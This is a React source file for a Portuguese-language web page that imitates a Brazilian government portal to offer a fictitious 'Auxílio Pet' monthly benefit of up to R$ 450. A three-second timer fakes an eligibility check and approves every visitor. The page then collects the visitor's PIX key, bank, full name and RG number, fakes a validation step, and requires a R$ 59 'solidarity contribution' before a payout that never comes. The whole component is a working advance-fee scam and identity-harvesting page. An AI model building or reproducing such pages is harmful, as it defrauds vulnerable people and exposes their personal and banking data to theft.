import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Heart, CheckCircle2, Sparkles, AlertCircle, Building2, User, CreditCard } from 'lucide-react';
import { useAnalytics } from '../hooks/useAnalytics';

function Analise() {
  const navigate = useNavigate();
  // Passos: analyzing -> approved (Tela de Aprovação) -> banking (Dados Saque) -> contribution -> payment
  const [currentStep, setCurrentStep] = useState<'analyzing' | 'approved' | 'banking' | 'contribution'>('analyzing');
  const [isProcessing, setIsProcessing] = useState(false);
  const { trackButtonClick } = useAnalytics('analise');

  // ... (Estados mantidos)
  const [bankData, setBankData] = useState({
    chavePix: '',
    banco: '',
    resideBrasil: 'Sim',
    nomeTitular: '',
    rg: ''
  });

  useEffect(() => {
    const timer = setTimeout(() => {
      setCurrentStep('approved');
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  const handleBankingSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setTimeout(() => {
      setIsProcessing(false);
      setCurrentStep('contribution');
    }, 1500);
  };

  const handlePaymentRedirect = () => {
    trackButtonClick('ir_para_pagamento');
    navigate('/pagamento');
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F9FA]">
      
      {/* BARRA BRASIL */}
      <div className="w-full bg-[#E5E5E5] py-1 px-4 text-xs text-[#333] flex justify-between font-sans">
        <span className="font-bold text-[#004d02] tracking-wider">BRASIL</span>
        <span className="hidden sm:inline">Acesso à informação</span>
      </div>
      <div className="gov-bar w-full h-[4px] bg-gradient-to-r from-[#00A91C] to-[#FFCC29]"></div>

      {/* HEADER SIMPLES */}
      <nav className="relative z-20 container mx-auto px-4 mt-6 mb-4">
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 px-6 py-4 flex items-center justify-between">
          {/* LOGO CLICÁVEL */}
          <div 
            onClick={() => navigate('/')} 
            className="flex items-center gap-2 cursor-pointer hover:opacity-80 transition-opacity"
          >
            <div className="bg-[#1351B4] p-1.5 rounded-lg">
              <Heart className="text-white" size={20} fill="currentColor" />
            </div>
            <span className="text-[#1351B4] text-lg font-bold tracking-tight">Auxílio Pet</span>
          </div>
        </div>
      </nav>

      <main className="relative z-10 container mx-auto px-4 pb-12 flex-1 flex flex-col items-center">
        <div className="w-full max-w-xl">
          
          {/* TELA 1: ANALISANDO (Loader) */}
          {currentStep === 'analyzing' && (
            <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-8 text-center animate-fadeIn mt-8">
              <div className="flex justify-center mb-6">
                <div className="relative">
                  <div className="w-20 h-20 rounded-full bg-blue-50 flex items-center justify-center">
                    <Sparkles className="text-[#1351B4]" size={32} />
                  </div>
                  <div className="absolute inset-0 rounded-full border-4 border-[#1351B4] border-t-transparent animate-spin"></div>
                </div>
              </div>
              <h2 className="text-2xl font-bold text-[#333] mb-2">Analisando suas respostas...</h2>
              <p className="text-gray-600">Verificando elegibilidade do perfil.</p>
            </div>
          )}

          {/* TELA 2: APROVAÇÃO (Texto do Roteiro) */}
          {currentStep === 'approved' && (
            <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 sm:p-8 animate-fadeIn">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <CheckCircle2 className="text-green-600" size={40} />
                </div>
                <h2 className="text-2xl font-bold text-green-700 mb-2">Parabéns!</h2>
                <p className="text-gray-600 text-lg">Seu cadastro foi aprovado com sucesso.</p>
              </div>

              <div className="bg-blue-50 border border-blue-100 rounded-xl p-5 mb-6">
                <p className="text-blue-900 text-sm sm:text-base leading-relaxed">
                  Com base nas informações fornecidas, seu perfil foi <span className="font-bold">APROVADO</span> para receber o Auxílio Pet, com possibilidade de apoio mensal de até <span className="font-bold text-xl">R$ 450,00</span>, destinado a alimentação, prevenção e cuidados veterinários essenciais.
                </p>
              </div>

              <div className="flex items-start gap-3 mb-8">
                <AlertCircle className="text-[#1351B4] flex-shrink-0 mt-1" size={20} />
                <p className="text-gray-600 text-sm">
                  <span className="font-bold text-[#1351B4]">Liberação imediata</span> para saque e utilização do benefício, após a confirmação dos dados cadastrais abaixo.
                </p>
              </div>

              <button 
                onClick={() => setCurrentStep('banking')}
                className="w-full bg-[#1351B4] hover:bg-[#0c326f] text-white font-bold text-lg py-4 rounded-full shadow-lg transition-all active:scale-95"
              >
                Confirmar Dados para Saque
              </button>
            </div>
          )}

          {/* TELA 3: DADOS PARA SAQUE (Q8-Q12) */}
          {currentStep === 'banking' && (
            <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 sm:p-8 animate-fadeIn">
              <h2 className="text-xl font-bold text-[#1351B4] mb-6 flex items-center gap-2">
                <Building2 size={24} />
                Dados para Saque
              </h2>

              <form onSubmit={handleBankingSubmit} className="space-y-5">
                {/* 8. Chave Pix */}
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">8️⃣ Informe a chave PIX para recebimento:</label>
                  <input 
                    type="text" 
                    required
                    value={bankData.chavePix}
                    onChange={e => setBankData({...bankData, chavePix: e.target.value})}
                    placeholder="CPF, Email ou Telefone"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#1351B4] outline-none"
                  />
                </div>

                {/* 9. Banco */}
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">9️⃣ Qual o banco da conta informada?</label>
                  <input 
                    type="text" 
                    required
                    value={bankData.banco}
                    onChange={e => setBankData({...bankData, banco: e.target.value})}
                    placeholder="Ex: Nubank, Caixa, Bradesco..."
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#1351B4] outline-none"
                  />
                </div>

                {/* 10. Reside no Brasil */}
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">🔟 O titular da conta reside no Brasil?</label>
                  <div className="flex gap-4">
                    <label className="flex items-center gap-2 cursor-pointer">
                      <input 
                        type="radio" 
                        name="reside" 
                        checked={bankData.resideBrasil === 'Sim'}
                        onChange={() => setBankData({...bankData, resideBrasil: 'Sim'})}
                        className="w-5 h-5 text-[#1351B4]"
                      />
                      <span className="text-gray-700">Sim</span>
                    </label>
                    <label className="flex items-center gap-2 cursor-pointer">
                      <input 
                        type="radio" 
                        name="reside" 
                        checked={bankData.resideBrasil === 'Não'}
                        onChange={() => setBankData({...bankData, resideBrasil: 'Não'})}
                        className="w-5 h-5 text-[#1351B4]"
                      />
                      <span className="text-gray-700">Não</span>
                    </label>
                  </div>
                </div>

                {/* 11. Nome Completo */}
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">1️⃣1️⃣ Nome completo do titular (conforme RG):</label>
                  <div className="relative">
                    <User className="absolute left-3 top-3.5 text-gray-400" size={18} />
                    <input 
                      type="text" 
                      required
                      value={bankData.nomeTitular}
                      onChange={e => setBankData({...bankData, nomeTitular: e.target.value})}
                      placeholder="Nome completo"
                      className="w-full pl-10 pr-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#1351B4] outline-none"
                    />
                  </div>
                </div>

                {/* 12. Número do RG */}
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">1️⃣2️⃣ Confirme o número do RG:</label>
                  <input 
                    type="text" 
                    required
                    value={bankData.rg}
                    onChange={e => setBankData({...bankData, rg: e.target.value})}
                    placeholder="00.000.000-0"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#1351B4] outline-none"
                  />
                </div>

                <button 
                  type="submit"
                  disabled={isProcessing}
                  className="w-full bg-[#1351B4] hover:bg-[#0c326f] text-white font-bold text-lg py-4 rounded-full shadow-lg transition-all active:scale-95 disabled:opacity-70 mt-6"
                >
                  {isProcessing ? 'Validando...' : 'Validar e Liberar Saque'}
                </button>
              </form>
            </div>
          )}

          {/* TELA 4: CONTRIBUIÇÃO SOLIDÁRIA */}
          {currentStep === 'contribution' && (
            <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 sm:p-8 animate-fadeIn">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4 shadow-sm">
                  <Heart className="text-[#1351B4]" size={32} fill="currentColor" />
                </div>
                <h2 className="text-2xl font-bold text-[#333] mb-2">Contribuição Solidária</h2>
                <div className="inline-block px-4 py-1 bg-blue-100 rounded-full text-[#1351B4] font-bold text-sm mb-4">
                  Etapa Final para Liberação
                </div>
              </div>

              <div className="space-y-4 text-gray-600 text-sm sm:text-base leading-relaxed mb-8">
                <p>
                  Para concluir a liberação do Auxílio Pet e habilitar o <strong>saque imediato</strong>, é necessária a realização de uma Contribuição Solidária no valor de <span className="text-[#1351B4] font-bold text-lg">R$ 59,00</span>.
                </p>
                <div className="bg-[#F8F9FA] p-4 rounded-xl border border-gray-200">
                  <p className="italic text-gray-500 text-xs sm:text-sm">
                    "Essa contribuição é destinada exclusivamente às ONGs e organizações sociais que atuam no resgate, cuidado, tratamento e proteção de animais, fortalecendo a rede de apoio que permite ajudar mais famílias."
                  </p>
                </div>
                <p>
                  Com esse gesto solidário, evitamos que tutores precisem abandonar quem mais amam por falta de recursos, garantindo dignidade e cuidado contínuo.
                </p>
              </div>

              <button 
                onClick={handlePaymentRedirect}
                className="w-full bg-gradient-to-r from-[#1351B4] to-[#0c326f] text-white font-bold text-lg py-4 rounded-full shadow-xl hover:shadow-2xl transition-all transform hover:-translate-y-1 flex items-center justify-center gap-2"
              >
                <CreditCard size={20} />
                Realizar Contribuição
              </button>
              
              <p className="text-center text-xs text-gray-400 mt-4">
                Ambiente seguro e autenticado.
              </p>
            </div>
          )}

        </div>
      </main>
    </div>
  );
}

export default Analise;